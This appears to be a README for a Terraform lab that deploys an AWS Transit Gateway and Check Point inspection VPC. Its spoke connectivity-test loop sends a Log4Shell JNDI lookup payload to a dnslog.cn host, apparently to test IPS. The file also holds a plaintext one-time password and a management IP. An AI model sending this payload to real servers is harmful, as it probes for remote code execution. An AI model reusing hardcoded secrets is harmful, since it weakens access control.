# AWS lab with App spokes, TGW and CHKP VPC

Inspired by work at https://github.com/aws-samples/aws-network-firewall-terraform/
Diagram https://github.com/aws-samples/aws-network-firewall-terraform/blob/main/images/anfw-terraform-sample.jpg

```shell
# working folder
cd /workspaces/tf-playground/50-aws-tgw-chkp-vpc

tf init

# bring credentials - AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

tf plan -target module.env

# step by step

# network environment
tf apply -auto-approve -target module.env

tf apply -auto-approve -target module.routes

# workloads in spokes accessible using SSM
tf apply -auto-approve -target module.instances

# Check Point Management in Inspection VPC
tf apply -auto-approve -target module.cpman

# Check Point Security Gateways with GWLB in Inspection VPC
tf apply -auto-approve -target module.cgns

# full deployment
tf apply -auto-approve

# CP management console
ssh admin@34.247.143.157 -i C:\Users\mkoldov\.ssh\azureshell.key


# x-chkp-tags	management=CP-Management-gwlb-tf:template=gwlb-configuration:ip-address=private
autoprov_cfg init AWS -mn CP-Management-gwlb-tf -tn gwlb-configuration -otp WelcomeHome1984 -po Standard -cn cpman -r eu-west-1 -iam -ver R81.20

autoprov_cfg set template -tn gwlb-configuration -ia -ips

watch -d api status

tail -f /var/log/CPcme/cme.log

# mgmt ip 10.255.77.227
# cplic - required for IPS!

#connectivity test from spoke hosts
while true; do curl -s -m1 ip.iol.cz/ip/; echo; ping -c1 1.1.1.1; sleep 3; curl -s -m2 ip.iol.cz/ip/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}';  done


```

TODO:
- [ ] enable Management API and provision API user
 -[ ] management license?
- [ ] Gaia timezone 
- [ ] diagrams
- [ ] create SSH key with Terraform and add CPMAN login instructions
- [ ] policy made by Terraform
- [ ] E-W and Ingress traffic inspection
- [ ] TF unexpceted replacement - lifecycle / ignore_changes fine tune!
